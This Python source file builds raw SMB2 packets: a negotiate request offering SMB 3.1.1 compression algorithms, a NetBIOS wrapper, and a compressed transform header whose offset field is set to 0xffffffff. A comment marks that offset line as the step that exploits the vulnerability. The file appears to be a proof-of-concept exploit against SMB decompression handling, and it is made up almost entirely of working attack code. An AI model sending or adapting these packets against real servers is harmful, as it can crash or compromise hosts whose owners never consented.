import struct


class Smb2Header:
    def __init__(self, command, message_id):
        self.protocol_id = "\xfeSMB"
        self.structure_size = "\x40\x00"  # Must be set to 0x40
        self.credit_charge = "\x00"*2
        self.channel_sequence = "\x00"*2
        self.channel_reserved = "\x00"*2
        self.command = command
        self.credits_requested = "\x00"*2  # Number of credits requested / granted
        self.flags = "\x00"*4
        self.chain_offset = "\x00"*4  # Points to next message
        self.message_id = message_id
        self.reserved = "\x00"*4
        self.tree_id = "\x00"*4  # Changes for some commands
        self.session_id = "\x00"*8
        self.signature = "\x00"*16

    def get_packet(self):
        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signature

class Smb2NegotiateRequest:
    def __init__(self):
        self.header = Smb2Header("\x00"*2, "\x00"*8)
        self.structure_size = "\x24\x00"
        self.dialect_count = "\x08\x00"  # 8 dialects
        self.security_mode = "\x00"*2
        self.reserved = "\x00"*2
        self.capabilities = "\x7f\x00\x00\x00"
        self.guid = "\x01\x02\xab\xcd"*4
        self.negotiate_context = "\x78\x00"
        self.additional_padding = "\x00"*2
        self.negotiate_context_count = "\x02\x00"  # 2 Contexts
        self.reserved_2 = "\x00"*2
        self.dialects = "\x02\x02" + "\x10\x02" + "\x22\x02" + "\x24\x02" + "\x00\x03" + "\x02\x03" + "\x10\x03" + "\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        self.padding = "\x00"*4

    def context(self, type, length):
        data_length = length
        reserved = "\x00"*4
        return type + data_length + reserved

    def preauth_context(self):
        hash_algorithm_count = "\x01\x00"  # 1 hash algorithm
        salt_length = "\x20\x00"
        hash_algorithm = "\x01\x00"  # SHA512
        salt = "\x00"*32
        pad = "\x00"*2
        length = "\x26\x00"
        context_header = self.context("\x01\x00", length)
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad

    def compression_context(self):
        compression_algorithm_count = "\x03\x00"  # 3 Compression algorithms
        padding = "\x00"*2
        flags = "\x01\x00\x00\x00"
        algorithms = "\x01\x00" + "\x02\x00" + "\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        length = "\x0e\x00"
        context_header = self.context("\x03\x00", length)
        return context_header + compression_algorithm_count + padding + flags + algorithms

    def get_packet(self):
        padding = "\x00"*8
        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + padding

class NetBIOSWrapper:
    def __init__(self, data):
        self.session = "\x00"
        self.length = struct.pack('>i', len(data)).decode('latin1')[1:]
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data

class Smb2CompressedTransformHeader:
    def __init__(self, data):
        self.data = data
        self.protocol_id = "\xfcSMB"
        self.original_decompressed_size = struct.pack('<i', len(self.data)).decode('latin1')
        self.compression_algorithm = "\x01\x00"
        self.flags = "\x00"*2
        self.offset = "\xff\xff\xff\xff"  # Exploit the vulnerability

    def get_packet(self):
        return self.protocol_id + self.original_decompressed_size + self.compression_algorithm + self.flags + self.offset + self.data